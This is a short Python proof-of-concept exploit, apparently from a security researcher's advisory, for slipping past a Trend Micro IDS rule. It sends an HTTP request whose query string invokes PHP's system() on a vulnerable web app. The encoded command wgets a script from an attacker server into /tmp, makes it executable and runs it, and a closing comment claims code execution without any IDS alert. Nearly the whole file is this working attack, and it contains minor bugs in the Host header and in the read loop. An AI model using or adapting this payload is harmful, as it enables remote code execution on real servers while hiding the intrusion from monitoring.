from socket import *
#Bypass TM DDI IDS e.g. Rule 2452 (Wget command line injection) PoC
#Discovery: hyp3rlinx - ApparitionSec
#Apparition Security
#Firewall Rule Bypass

IP = raw_input("[+] Trend Micro IDS")
PORT = 80

payload="/index.php?s=/index/vulnerable/app/invoke&function=call_user_func_array&vars[0]=system&vars[1][]=%77%67%65%74%20http://Attacker-Server/x.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a"
req = "GET "+payload+" HTTP/1.1\r\nHost"+IP+"\r\nConnection: close\r\n\r\n"

s=socket(AF_INET, SOCK_STREAM)
s.connect((IP, PORT))
s.send(req)
res=""

while True:
    res = s.recv(512)
    print res
    if res=="\n" or "</html>":
        break

s.close()


#Result is 200 HTTP OK and code execution on vuln app and No IDS Alert gets triggered.
